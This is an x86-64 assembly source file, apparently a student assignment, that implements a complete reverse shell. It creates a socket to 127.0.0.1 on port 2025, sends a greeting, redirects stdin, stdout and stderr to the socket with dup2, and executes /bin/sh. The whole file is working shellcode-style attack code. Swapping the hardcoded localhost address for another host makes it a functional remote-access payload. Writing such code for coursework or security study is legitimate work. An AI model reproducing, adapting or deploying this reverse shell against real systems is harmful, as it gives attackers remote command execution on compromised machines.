; Josiah Stearns
; PEX1
; Reverse shell to localhost on port 2025
;
; Documentation:
;
; I used the following site as a reference for how to use dup2
; (although it was in arm7 so it had limited use):
; https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/
;
; No other help received

SECTION .data	; Data section, no allocated variables

SECTION .text	; Text section, holds static variables and code

Shell:  db `/bin/sh`,0;		; Shell command constant

Msg:    db `Remote shell!\n`,0;	; Hello message displayed on socket connection

global _start			; Expose entry point

_start:			; Entry point
        jmp _socket	; Open socket


_socket:	; Creates socket to localhost, sends initial message, and duplicates io
        ; Create socket struct in rsp
        xor rax, rax		; Zero out rax
        push rax		; Push 0 byte onto stack
        push dword 0x0100007f   ; address 127.0.0.1
        push word 0xE907        ; port 2025
        push word 0x0002        ; af_inet
        mov rax, 41		; sys_socket syscall
        mov rdi, 0x0002         ; family
        mov rsi, 0x0001         ; type
        mov rdx, 0		; protocol
        syscall			; Execute sys_socket
        mov r15, rax		; Save socket fd to r15

        ; Connect to socket
        mov rdi, r15    ; fd
        mov rax, 42     ; sys_connect syscall
        mov rsi, rsp	; sockaddr (previously pushed onto stack)
        mov rdx, 16	; addrlen
        syscall		; Execute sys_connect

        ; Check if socket success
        cmp rax, 0	; Check return value of sys_connect
        jne _exit	; If not 0 (no error), exit

        ; Send Msg
        mov rdi, r15    ; fd
        mov rax, 44     ; sys_sendto syscall
        mov rsi, Msg    ; buff
        mov rdx, 14     ; len
        mov r10, 0      ; flags
        mov r8, rsp     ; addr (set in _socket)
        mov r9, 16      ; addr_len
        syscall		; Execute sys_sendto


        ; Duplicate stdin fd
        mov rax, 33     ; sys_dup2 syscall
        mov rdi, r15    ; socket fd
        mov rsi, 0      ; stdin
        syscall		; Execute sys_dup2

        ; Duplicate stdout fd
        mov rax, 33	; sys_dup2 syscall
        mov rdi, r15	; socket fd
        mov rsi, 1	; stdout
        syscall		; Execute sys_dup2

        ; Duplicate stderr fd
        mov rax, 33	; sys_dup2 syscall
        mov rdi, r15	; socket fd
        mov rsi, 2	; stderr
        syscall		; Execute sys_dup2


	; Socket now established with duplicated stdin, stdout, and stderr

        jmp _shell	; Execute shell



_shell:		; Executes shell
        ; Open shell
        mov rax, 59     ; sys_execve syscall
        mov rdi, Shell  ; filename (/bin/sh)
        mov rsi, 0      ; argv
        mov rdx, 0      ; envp
        syscall		; Execute sys_execve


        jmp _exit	; Once shell exits, exit





_exit:		; Exits gracefully
	; Exit
        mov rax, 60	; sys_exit syscall
        mov rdi, 0	; error_code (0 for no error)
        syscall		; Execute sys_exit
